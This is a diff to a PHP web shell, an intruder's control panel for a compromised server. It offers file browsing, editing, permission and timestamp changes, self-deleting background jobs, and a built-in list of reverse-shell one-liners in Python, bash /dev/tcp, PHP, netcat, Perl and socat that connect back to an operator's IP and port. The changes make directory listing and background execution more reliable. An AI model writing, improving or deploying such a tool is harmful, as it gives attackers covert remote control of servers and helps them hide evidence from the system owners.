@@ -60,7 +60,10 @@ function get_store($key) {
 $action = isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : '');
 
 // Virtual Session Initialization
-if (empty($_SESSION['current_dir'])) { $_SESSION['current_dir'] = realpath(getcwd() ?: '.'); }
+if (empty($_SESSION['current_dir'])) {
+    $cwd = getcwd();
+    $_SESSION['current_dir'] = ($cwd && realpath($cwd)) ? realpath($cwd) : '.';
+}
 if (empty($_SESSION['terminal_cwd'])) { $_SESSION['terminal_cwd'] = $_SESSION['current_dir']; }
 if (!isset($_SESSION['reverse_shells'])) { $_SESSION['reverse_shells'] = array(); }
 
@@ -521,12 +524,17 @@ if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQ
             }
             break;
         case 'list_dir':
-            $post_dir = isset($_POST['dir']) ? $_POST['dir'] : $_SESSION['current_dir'];
+            $post_dir = (isset($_POST['dir']) && $_POST['dir'] !== '') ? $_POST['dir'] : $_SESSION['current_dir'];
             $dir = realpath($post_dir);
-            if ($dir && is_dir($dir) && is_readable($dir)) {
-                $_SESSION['current_dir'] = $dir;
-                $response = array('status' => 'success', 'path' => $dir, 'listing' => getDirectoryListing($dir));
-            } else { $response['message'] = 'Directory not found or not readable.'; }
+            if (!$dir && file_exists($post_dir)) $dir = $post_dir; // Fallback if realpath fails due to perms
+
+            if ($dir && is_dir($dir)) {
+                $listing = getDirectoryListing($dir);
+                if ($listing !== false) {
+                    $_SESSION['current_dir'] = $dir;
+                    $response = array('status' => 'success', 'path' => $dir, 'listing' => $listing);
+                } else { $response['message'] = 'Permission denied or error reading directory.'; }
+            } else { $response['message'] = 'Directory not found or inaccessible: ' . $post_dir; }
             break;
         case 'get_file_content':
             $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']);
@@ -738,10 +746,11 @@ if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQ
             }
             $php_script .= 'file_put_contents($file, "done\n", FILE_APPEND); @unlink($pid_file); @unlink(__FILE__); ?>';
             file_put_contents($script_file, $php_script);
+            $php_bin = defined('PHP_BINARY') ? PHP_BINARY : 'php';
             if (get_os_type() === 'WIN') {
-                pclose(popen("start /B php -f \"{$script_file}\" > NUL 2>&1", 'r'));
+                pclose(popen("start /B \"\" \"$php_bin\" -f \"{$script_file}\" > NUL 2>&1", 'r'));
             } else {
-                pclose(popen("nohup php -f \"{$script_file}\" > /dev/null 2>&1 &", 'r'));
+                pclose(popen("nohup \"$php_bin\" -f \"{$script_file}\" > /dev/null 2>&1 &", 'r'));
             }
             $response = array('status' => 'success', 'scan_id' => $scan_id);
             break;
@@ -903,7 +912,8 @@ document.addEventListener('DOMContentLoaded', () => {
     };
 
     const userHost = <?php echo json_encode(get_current_user_host()); ?>;
-    const revShellPayloads = { "Python3 PTY": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"sh\")'", "Bash TCP (Interactive)": "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'", "PHP proc_open": "php -r '$s=fsockopen(\"{ip}\",{port});$proc=proc_open(\"sh -i\", array(0=>$s, 1=>$s, 2=>$s),$pipes);'", "Netcat (mkfifo)": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f", "Perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'", "Socat PTY": "socat TCP:{ip}:{port} EXEC:sh,pty,stderr,setsid,sigint,sane", };
+    const phpBin = <?php echo json_encode(defined('PHP_BINARY') ? PHP_BINARY : 'php'); ?>;
+    const revShellPayloads = { "Python3 PTY": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"sh\")'", "Bash TCP (Interactive)": "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'", "PHP proc_open": `${phpBin} -r '$s=fsockopen(\"{ip}\",{port});$proc=proc_open(\"sh -i\", array(0=>$s, 1=>$s, 2=>$s),$pipes);'`, "Netcat (mkfifo)": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f", "Perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'", "Socat PTY": "socat TCP:{ip}:{port} EXEC:sh,pty,stderr,setsid,sigint,sane", };
     const formatBytes = b => {if(!+b)return"N/A";const k=1024,s=["B","KB","MB","GB","TB"],i=Math.floor(Math.log(b)/Math.log(k));return`${parseFloat((b/k**i).toFixed(2))} ${s[i]}`};
     const showToast = (message) => { const toast = G('toast'); toast.textContent = message; toast.style.display = 'block'; setTimeout(() => { toast.style.display = 'none'; }, 4000); };
 
@@ -965,6 +975,8 @@ document.addEventListener('DOMContentLoaded', () => {
         if (data) {
             G('path-bar').textContent = data.path;
             G('file-manager-tbody').innerHTML = data.listing.map(item => `<tr><td>${item.is_dir ? `<a href="#" data-dir="${item.name}" style="color:black">${item.name}</a>` : `<a href="#" data-action="preview" data-path="${item.name}" style="color: orange" title="Preview file content">${item.name}</a>`}</td><td>${item.type}</td><td>${item.size === '-' ? '-' : formatBytes(item.size)}</td><td>${item.modified}</td><td style="font-family:monospace; font-size: 0.9em; color: #00FF00">${item.permissions}</td><td class="actions">${!item.is_dir ? `<button data-action="edit" data-path="${item.name}" title="Edit">📝</button>` : ''}<button data-action="perms" data-path="${item.name}" data-current-perms="${item.permissions_oct}" title="Change Permissions">⚙️</button><button data-action="rename" data-path="${item.name}" title="Rename">✏️</button><button data-action="date" data-path="${item.name}" title="Change Date">🗓️</button>${!item.is_dir ? `<a href="?action=download&file=${encodeURIComponent(item.name)}&<?php echo $g_k . '=' . $g_v; ?>" class="button-link" title="Download">⬇️</a>` : ''}<button data-action="delete" data-path="${item.name}" class="danger">Del</button></td></tr>`).join('');
+        } else if (data && data.message) {
+            showToast("File Manager Error: " + data.message);
         }
     };
     G('file-manager-tbody').addEventListener('click', e => { const dirLink = e.target.closest('a[data-dir]'); const actionTarget = e.target.closest('[data-action]'); if (dirLink) { e.preventDefault(); loadFileManager(G('path-bar').textContent + '/' + dirLink.dataset.dir); return; } if (actionTarget) { e.preventDefault(); const action = actionTarget.dataset.action; const path = actionTarget.dataset.path; const currentPath = G('path-bar').textContent; if (action === 'delete') { if (confirm(`Are you sure you want to delete "${path}"?`)) { apiRequest(buildFormData({ action: 'delete_item', path })).then(d => d && loadFileManager(currentPath)); } } else if (action === 'edit' || action === 'preview') { apiRequest(buildFormData({ action: 'get_file_content', path })).then(data => { if (data) { state.currentFileForEditor = data.path; G('editor-header').textContent = `File: ${data.path}`; G('file-content-textarea').value = data.content; G('editor-modal').style.display = 'flex'; } }); } else if (action === 'rename') { const newName = prompt(`Enter new name for "${path}":`, path); if (newName && newName !== path) { apiRequest(buildFormData({ action: 'rename_item', path, new_name: newName })).then(d => d && loadFileManager(currentPath)); } } else if (action === 'perms') { const currentPerms = actionTarget.dataset.currentPerms || '0644'; const newPerms = prompt(`Enter new permissions for "${path}" (octal format):`, currentPerms); if (newPerms && /^[0-7]{3,4}$/.test(newPerms)) { apiRequest(buildFormData({ action: 'change_permissions', path, permissions: newPerms })).then(d => d && loadFileManager(currentPath)); } else if (newPerms !== null) { showToast('Invalid format. Please use 3 or 4 octal digits (e.g., 0755).'); } } else if (action === 'date') { const newDate = prompt(`Enter a new date/time for "${path}":\n(e.g., "now", "2024-01-01 12:00:00")`, "now"); if (newDate) { apiRequest(buildFormData({ action: 'change_date', path, new_date: newDate })).then(d => d && loadFileManager(currentPath)); } } } });
